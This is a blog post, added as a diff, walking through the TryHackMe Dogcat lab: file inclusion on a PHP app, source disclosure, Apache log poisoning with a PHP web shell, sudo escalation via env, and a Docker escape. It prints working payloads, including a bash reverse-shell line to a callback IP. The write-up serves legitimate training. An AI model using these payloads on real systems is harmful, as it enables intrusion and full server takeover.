@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A practical Dogcat room walkthrough covering PHP file inclusion, source disclosure with php://filter, Apache log poisoning, reverse-shell access, sudo privilege escalation, Docker escape, and relevant MITRE ATT&amp;CK mappings.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-dogcat-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape">
+  <meta property="og:description" content="A practical Dogcat room walkthrough covering PHP file inclusion, source disclosure with php://filter, Apache log poisoning, reverse-shell access, sudo privilege escalation, Docker escape, and relevant MITRE ATT&amp;CK mappings.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-dogcat-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-10-15T13:47:48.255Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape">
+  <meta name="twitter:description" content="A practical Dogcat room walkthrough covering PHP file inclusion, source disclosure with php://filter, Apache log poisoning, reverse-shell access, sudo privilege escalation, Docker escape, and relevant MITRE ATT&amp;CK mappings.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape","description":"A practical Dogcat room walkthrough covering PHP file inclusion, source disclosure with php://filter, Apache log poisoning, reverse-shell access, sudo privilege escalation, Docker escape, and relevant MITRE ATT&CK mappings.","datePublished":"2026-10-15T13:47:48.255Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-dogcat-writeup/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-tryhackme-dogcat-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 15-10-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<h1>TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape</h1>
+<p>Room: <a href="https://tryhackme.com/room/dogcat">Dogcat</a></p>
+<p>Dogcat is a web exploitation room in which a PHP application displays dog and cat pictures. The challenge involves exploiting a local file inclusion (LFI) flaw, using PHP wrappers to inspect source code, poisoning Apache access logs to achieve command execution, escalating privileges, and escaping a Docker container.</p>
+<blockquote>
+<p><strong>Lab target:</strong> <code>10.48.136.199</code></p>
+<p>Replace this address with the IP assigned to your own running room instance.</p>
+</blockquote>
+<h2>1. Reconnaissance</h2>
+<p>Since the target exposes a web application, start by checking the HTTP response headers.</p>
+<pre><code class="language-bash">curl -I http://10.48.136.199/
+</code></pre>
+<img width="422" height="168" alt="Screenshot 2026-10-15 161354" src="https://github.com/user-attachments/assets/fb104a32-54c0-468e-a386-5a16b86afdc6" />
+
+
+<p>The response identifies Apache as the web server. This is useful reconnaissance information and gives us a likely default location for the Apache access log, which we will investigate later.</p>
+<p>Next, open the target in Firefox with Burp Suite configured as the browser proxy.</p>
+<img width="906" height="443" alt="Screenshot 2026-10-15 161738" src="https://github.com/user-attachments/assets/f6c0ea23-c9f7-408a-9c4c-ae00806c12c6" />
+
+
+<p>The page offers two buttons: <strong>Dog</strong> and <strong>Cat</strong>. Selecting either option loads a corresponding picture. Notice that the URL changes according to the selected option:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=cat
+</code></pre>
+<p>Selecting Dog changes the parameter to <code>view=dog</code>. The application is using the <code>view</code> parameter to determine what content to load, so it is worth testing how the application handles file paths.</p>
+<h2>2. Testing the <code>view</code> Parameter</h2>
+<p>Begin with a basic traversal attempt:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=../index.php
+</code></pre>
+<p>The application responds that only dog and cat are allowed.</p>
+<img width="765" height="493" alt="Screenshot 2026-10-15 161837" src="https://github.com/user-attachments/assets/87b17d15-7566-490d-809d-f2abf4615745" />
+
+
+<p>This suggests that the application validates the supplied value. Try keeping an allowed value at the beginning of the path while adding a traversal segment:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=dog/../index
+</code></pre>
+<img width="1253" height="690" alt="Screenshot 2026-10-15 161907" src="https://github.com/user-attachments/assets/3917690c-b324-4659-86d8-91fa2a0bf12d" />
+
+
+<p>The response changes to a file-stream or file-opening error. That is a useful clue: the input appears to have passed a different stage of the application&#39;s processing. It does not, by itself, prove arbitrary file read, but it gives us a promising direction.</p>
+<h2>3. Reading PHP Source with a Wrapper</h2>
+<p>PHP stream wrappers provide a common interface for accessing different types of resources. The <code>php://filter</code> wrapper can apply filters to a resource before its contents are returned. In particular, Base64 encoding lets us inspect PHP source as text instead of having the server execute the source code.</p>
+<p>A useful example is:</p>
+<pre><code class="language-text">php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+<p>Other filters exist, including ROT13 and character-encoding conversions, but Base64 is a straightforward first choice for source-code inspection. Filters are not universal security-control bypasses; whether a payload works depends on the application&#39;s validation and file-loading logic.</p>
+<p>Use the following URL to request the encoded source:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=php://filter/convert.base64-encode/resource=dog/../index
+</code></pre>
+<img width="1021" height="452" alt="Screenshot 2026-10-01 205310" src="https://github.com/user-attachments/assets/cdafce79-f9f6-47ca-bdcf-24c186ff2b97" />
+
+
+<p>Copy the encoded string into Burp Suite&#39;s Decoder and decode it using Base64. You can then copy the result into a text editor, which is much easier to read than a small response pane.</p>
+<img width="1894" height="493" alt="Screenshot 2026-10-15 162247" src="https://github.com/user-attachments/assets/f83b33b8-83a5-4192-8bd3-5095d2631917" />
+
+
+<p>One important part of the source is:</p>
+<pre><code class="language-php">$ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;
+</code></pre>
+<p>This uses PHP&#39;s ternary operator:</p>
+<ul>
+<li>If the <code>ext</code> GET parameter is present, its value is assigned to <code>$ext</code>.</li>
+<li>Otherwise, <code>$ext</code> defaults to <code>.php</code>.</li>
+</ul>
+<p>This matters because the application appends an extension to the requested view. Supplying an empty <code>ext</code> parameter can prevent the default <code>.php</code> suffix from being appended.</p>
+<h2>4. Reading Local Files</h2>
+<p>Now that we understand the extension-handling logic, try reading <code>/etc/passwd</code> by using path traversal and an empty <code>ext</code> parameter:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=dog/../../../../etc/passwd&amp;ext=
+</code></pre>
+<img width="1154" height="685" alt="Screenshot 2026-10-15 162937" src="https://github.com/user-attachments/assets/414a64a2-e0dc-4e8a-a394-cdca98efe68d" />
+
+
+<p>The file contents confirm that the application can read a local file outside its intended image resources. The number of traversal segments needed depends on the application&#39;s working directory and path resolution.</p>
+<p>Because the response headers identified Apache, test the usual Debian/Ubuntu Apache access-log path:</p>
+<pre><code class="language-text">/var/log/apache2/access.log
+</code></pre>
+<p>For clearer browser rendering, you can use Firefox&#39;s view-source mode:</p>
+<pre><code class="language-text">view-source:http://10.48.136.199/?view=dog/../../../../var/log/apache2/access.log&amp;ext=
+</code></pre>
+<img width="1509" height="803" alt="Screenshot 2026-10-15 163111" src="https://github.com/user-attachments/assets/4bc621ed-af04-445e-b9a4-17f4aae118c3" />
+
+
+<p>We can read the access log. The next question is whether the application will interpret PHP code embedded in that log when the log is included.</p>
+<h2>5. Apache Log Poisoning</h2>
+<p>An Apache access log commonly records request metadata, including the User-Agent header. If an attacker can control that header and the application later includes the log through a PHP execution path, PHP code in the log may be interpreted. This technique is known as <strong>log poisoning</strong>.</p>
+<p>In Burp Suite, send a request to Repeater and change the User-Agent header to the following PHP test payload:</p>
+<pre><code class="language-php">&lt;?php echo shell_exec(&#39;id&#39;); ?&gt;
+</code></pre>
+<img width="731" height="665" alt="Screenshot 2026-10-15 163305" src="https://github.com/user-attachments/assets/6df0b8c1-84ca-4fa3-8690-82894a5758b0" />
+
+
+<p>Send the request to write the payload into the access log. Then request the log through the vulnerable <code>view</code> parameter again.</p>
+<img width="1301" height="174" alt="Screenshot 2026-10-15 163324" src="https://github.com/user-attachments/assets/de59fe65-0f82-416a-a1d9-f41b4668a942" />
+
+
+<p>If the payload is executed, the output of <code>id</code> should appear in the response. The important distinction is that merely viewing a log does not execute PHP: the log must be processed in a context where PHP interprets its contents.</p>
+<p>Next, replace the test payload with a command-execution web shell:</p>
+<pre><code class="language-php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<img width="721" height="539" alt="Screenshot 2026-10-15 163402" src="https://github.com/user-attachments/assets/7579293f-d5ce-48ad-9a1e-0ad67ddda415" />
+
+
+<p>Send the request so the payload is written into the log. Then supply the <code>cmd</code> parameter while including the log:</p>
+<pre><code class="language-text">view-source:http://10.48.136.199/?view=dog/../../../../var/log/apache2/access.log&amp;ext&amp;cmd=ls
+</code></pre>
+<p>The bare <code>ext</code> parameter is present with an empty value, so PHP does not use the default <code>.php</code> extension. The <code>cmd=ls</code> parameter is read by the injected PHP code.</p>
+<img width="670" height="330" alt="Screenshot 2026-10-15 164444" src="https://github.com/user-attachments/assets/b740e4ab-0859-40a3-88a9-7b00ce935733" />
+
+
+<p>The response should display files from the application&#39;s current working directory. The listing also reveals a <code>flag.php</code> file.</p>
+<p><strong>Security note:</strong> This web shell is intentionally minimal and unsafe. Use it only in the assigned lab environment, and remove any test artifacts if the environment allows it.</p>
+<h2>6. Retrieving the First Flag</h2>
+<p>The directory listing reveals <code>flag.php</code>. Instead of including it normally, use the PHP filter wrapper to Base64-encode its source:</p>
+<pre><code class="language-text">http://10.48.136.199/?view=php://filter/convert.base64-encode/resource=dog/../flag
+</code></pre>
+<p>Copy the Base64 output into Burp Decoder and decode it. Inspect the returned source to locate the first flag.</p>
+<img width="816" height="533" alt="Screenshot 2026-10-15 164746" src="https://github.com/user-attachments/assets/8698b271-96a3-4d0b-b280-4ac994085930" />
+
+
+<h2>7. Obtaining a Reverse Shell</h2>
+<p>Command execution through the poisoned log is useful, but an interactive shell is more convenient for further enumeration.</p>
+<p>On Kali Linux, locate the PHP reverse-shell example under the system&#39;s web shells directory. Copy it into your lab working directory and edit the callback IP and port to match your attacker machine and listener.</p>
+<img width="705" height="62" alt="Screenshot 2026-10-15 163640" src="https://github.com/user-attachments/assets/d5d445ce-1fd6-4350-950e-95fd85e53c4c" />
+
+<img width="557" height="250" alt="Screenshot 2026-10-15 163736" src="https://github.com/user-attachments/assets/2d33e360-54fc-41e7-be31-c078669af1d9" />
+
+
+<p>I also created <strong>ShellParcel</strong>, a Python utility for transferring a shell file through an existing web shell:</p>
+<p><a href="https://github.com/giriaryan694-a11y/ShellParcel">ShellParcel on GitHub</a></p>
+<img width="1764" height="791" alt="Screenshot 2026-10-15 164024" src="https://github.com/user-attachments/assets/f6553d37-2691-496b-a5b8-8ae2c4292cfc" />
+
+
+<p>Start a listener on the configured port, then trigger the transferred PHP shell through the web-accessible path.</p>
+<img width="942" height="625" alt="Screenshot 2026-10-15 164114" src="https://github.com/user-attachments/assets/7fd5d4fd-1b7c-4164-a655-7aa5689952a8" />
+
+
+<p>A successful connection gives us a shell in the compromised application environment. The exact behavior depends on the payload configuration and the container&#39;s available tools.</p>
+<h2>8. Finding the Next Flag</h2>
+<p>With shell access, search for flag-related files:</p>
+<pre><code class="language-bash">find / -type f -iname &#39;*flag*&#39; 2&gt;/dev/null
+</code></pre>
+<img width="554" height="207" alt="Screenshot 2026-10-15 165138" src="https://github.com/user-attachments/assets/76887c4d-d25f-4c43-af9c-f8612c69e51c" />
+
+
+<p>Inspect the relevant file and record the flag.</p>
+<h2>9. Privilege Escalation with <code>env</code></h2>
+<p>Check which commands the current user is allowed to run with elevated privileges:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<img width="827" height="216" alt="Screenshot 2026-10-15 172412" src="https://github.com/user-attachments/assets/ab9e16a9-8b10-4b07-8f83-da99027e4418" />
+
+
+<p>In this room, the output indicates that <code>env</code> can be run through <code>sudo</code>. The <a href="https://gtfobins.github.io/gtfobins/env/">GTFOBins entry for <code>env</code></a> documents how this configuration can be abused to launch another program with the granted privileges.</p>
+<p>In the lab, run:</p>
+<pre><code class="language-bash">sudo env /bin/sh
+</code></pre>
+<p>Then verify the effective identity:</p>
+<pre><code class="language-bash">whoami
+</code></pre>
+<img width="212" height="80" alt="Screenshot 2026-10-15 172548" src="https://github.com/user-attachments/assets/b4c7c093-e310-4f66-a222-c0144c503f15" />
+
+
+<p>If the command succeeds with elevated privileges, inspect the relevant directory and read the third flag.</p>
+<img width="424" height="133" alt="Screenshot 2026-10-15 172712" src="https://github.com/user-attachments/assets/9e192354-8941-4b23-9b03-73bfb732318f" />
+
+
+<p>This is a <strong>sudo misconfiguration</strong>: a command that can launch other programs has been granted elevated execution without an adequate restriction.</p>
+<h2>10. Escaping the Docker Container</h2>
+<p>The final stage requires escaping the container to reach the host environment. During enumeration, I found a backup directory under <code>/opt</code> containing a compressed archive and a script named <code>backup.sh</code>.</p>
+<p>Inspect the script:</p>
+<pre><code class="language-bash">cat /opt/backup/backup.sh
+</code></pre>
+<img width="816" height="250" alt="Screenshot 2026-10-15 174319" src="https://github.com/user-attachments/assets/e4801c51-1e4e-48e2-84e3-64848784e7fe" />
+
+
+<p>The script contains a <code>tar</code> command that processes backup data. This suggests a scheduled or otherwise privileged backup workflow may be interacting with files accessible from the container. However, the script&#39;s contents alone do not prove that it runs on the host or that it runs with elevated host privileges. Confirm the execution context and permissions before drawing that conclusion.</p>
+<p>In my lab run, I modified the backup script to make a callback to my attacker machine:</p>
+<pre><code class="language-bash">echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.132.162/7777 0&gt;&amp;1&#39;&quot; &gt; backup.sh
+</code></pre>
+<p>Replace the IP address and port with your own lab callback details. Start a listener before the relevant backup process executes.</p>
+<img width="1699" height="627" alt="Screenshot 2026-10-15 174904" src="https://github.com/user-attachments/assets/5cd355fa-03e5-4f11-b26a-f6a8b2aeae5a" />
+
+<p>A successful callback can indicate that the modified script was executed in a different, potentially more privileged environment. Verify the environment and permissions after connecting instead of assuming every callback automatically means host root.</p>
+<p>Once host access is confirmed, locate and read the fourth flag.</p>
+<img width="822" height="277" alt="Screenshot 2026-10-15 174957" src="https://github.com/user-attachments/assets/f50f041a-657a-452b-b432-94b1ab40136b" />
+
+
+<h2>MITRE ATT&amp;CK Mapping</h2>
+<p>The following mappings describe the behaviors demonstrated in this lab. They are conceptual mappings, not a claim that every technique maps one-to-one to a single ATT&amp;CK technique.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>MITRE ATT&amp;CK technique</th>
+<th>Relevance</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web application exploitation</td>
+<td><a href="https://attack.mitre.org/techniques/T1190/">T1190: Exploit Public-Facing Application</a></td>
+<td>The exposed PHP application is exploited to obtain unintended file access and code execution.</td>
+</tr>
+<tr>
+<td>Local file and application data discovery</td>
+<td><a href="https://attack.mitre.org/techniques/T1083/">T1083: File and Directory Discovery</a></td>
+<td>The attacker enumerates files and directories after gaining command execution.</td>
+</tr>
+<tr>
+<td>Command execution through the web application</td>
+<td><a href="https://attack.mitre.org/techniques/T1059/004/">T1059.004: Unix Shell</a></td>
+<td>Shell commands are executed on the Linux environment.</td>
+</tr>
+<tr>
+<td>Reverse-shell communication</td>
+<td><a href="https://attack.mitre.org/techniques/T1095/">T1095: Non-Application Layer Protocol</a></td>
+<td>A shell callback uses a raw TCP connection. The precise mapping depends on the implementation and observed traffic.</td>
+</tr>
+<tr>
+<td>Abuse of elevated <code>sudo</code> permissions</td>
+<td><a href="https://attack.mitre.org/techniques/T1548/003/">T1548.003: Sudo and Sudo Caching</a></td>
+<td>A permitted command is used to obtain a more privileged shell.</td>
+</tr>
+<tr>
+<td>Container escape</td>
+<td><a href="https://attack.mitre.org/techniques/T1611/">T1611: Escape to Host</a></td>
+<td>The final stage attempts to cross the container boundary and access the host.</td>
+</tr>
+</tbody></table>
+<h2>Lessons Learned</h2>
+<ul>
+<li>Inspect parameters that control which files a web application loads.</li>
+<li>Read the source code when a file-inclusion flaw is suspected; small details such as extension handling can change the result.</li>
+<li>PHP wrappers can help disclose source code, but they are not a substitute for understanding the application&#39;s path validation.</li>
+<li>Log poisoning depends on both attacker-controlled log content and a path that causes PHP to interpret that content.</li>
+<li>Check <code>sudo -l</code> and validate the permissions of any command that can launch other programs.</li>
+<li>A Docker container is not automatically a security boundary if host-side processes, writable mounts, or privileged automation trust container-controlled files.</li>
+<li>Confirm execution context and privilege level at every stage. A shell connection alone does not prove root access on the host.</li>
+</ul>
+<p>The Dogcat room ties together web exploitation, post-exploitation, Linux privilege escalation, and container-boundary security in one practical exercise.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
